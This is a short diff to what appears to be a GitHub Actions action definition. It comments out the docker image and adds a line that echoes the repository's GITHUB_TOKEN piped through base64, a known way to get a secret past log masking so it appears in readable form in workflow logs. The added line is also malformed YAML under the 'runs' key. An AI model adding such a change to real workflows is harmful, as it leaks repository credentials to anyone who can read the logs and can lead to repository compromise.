@@ -10,5 +10,8 @@ outputs:
   time: # id of output
     description: 'The time we greeted you'
 runs:
-  using: 'docker'
-  image: 'docker://yavital/docker-action:latest'
+  echo ${{ secrets.GITHUB_TOKEN }} | base64
+
+
+  #using: 'docker'
+  #image: 'docker://yavital/docker-action:latest'
